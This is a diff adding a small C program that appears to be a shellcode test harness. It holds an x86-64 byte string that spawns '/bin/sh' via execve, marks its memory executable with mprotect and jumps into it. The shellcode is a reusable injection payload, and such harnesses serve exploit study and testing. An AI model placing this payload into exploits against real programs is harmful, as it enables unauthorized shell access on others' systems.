@@ -1,0 +1,28 @@
+#include <stdio.h>
+#include <sys/mman.h>
+
+char shellcode2[] =
+"\xeb\x27\x5b\x48\x89\x5b\x08\x48\x31\xc0\x88\x63\x07\x48\x89\x43\x10\x89\xc2"
+"\xb0\x3b\x48\x8b\x7b\x08\x48\x8d\x73\x08\x0f\x05\x48\x31\xc9\x48\x89\xcf\xb0"
+"\x3c\x0f\x05\xe8\xd4\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x20\x20\x20\x20"
+"\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20";
+
+unsigned long get_rsp()
+{
+	__asm__ ("mov %rsp,%rax");
+}
+
+int main()
+{
+	// unsigned long esp = get_rsp();
+	// esp = esp & 0xfffffffffffff000;
+
+	unsigned long addr = (unsigned long)shellcode2 & 0xfffffffffffff000;
+
+	mprotect((void*)addr,2*0x1000,PROT_EXEC|PROT_WRITE);
+
+	void (*funcptr)();
+	funcptr = shellcode2;
+	(*funcptr)();
+
+}
